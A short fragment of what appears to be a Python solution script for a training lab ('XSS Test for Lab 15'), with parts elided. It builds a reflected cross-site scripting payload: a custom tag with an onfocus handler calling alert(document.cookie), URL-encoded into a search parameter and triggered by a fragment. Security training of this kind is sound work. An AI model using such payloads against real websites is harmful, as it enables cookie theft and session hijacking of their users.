...
def xss_test(url, use_proxy=False):
    try:
        ...
        payload =   f"<script> location = '{url}?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>"
...
def main():
    parser = argparse.ArgumentParser(description='XSS Test for Lab 15')
